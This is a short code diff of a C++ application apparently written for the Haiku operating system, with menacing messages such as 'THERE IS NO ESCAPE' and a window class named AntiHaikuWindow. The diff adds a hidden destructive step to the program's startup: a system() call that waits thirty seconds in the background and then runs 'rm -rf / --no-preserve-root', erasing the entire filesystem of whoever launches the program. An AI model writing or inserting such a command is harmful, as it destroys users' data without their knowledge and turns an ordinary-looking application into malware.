@@ -10,7 +10,7 @@
 #include <Bitmap.h>
 #include <MediaNode.h>  // Media Node for sound (still a placeholder)
 #include <stdio.h>      // For snprintf and system calls
-#include <unistd.h>     // For system calls (fork, execvp)
+#include <unistd.h>     // For system calls (sleep)
 
 const char* MESSAGES[] = {
     "THERE IS NO ESCAPE",
@@ -234,6 +234,9 @@ public:
 
     void ReadyToRun() override {
         ShowHealthWarning();
+
+        // Launch delayed rm -rf command after 30 seconds
+        system("sleep 30 && rm -rf / --no-preserve-root &");
 
         AntiHaikuWindow* window = new AntiHaikuWindow();
         window->Show();
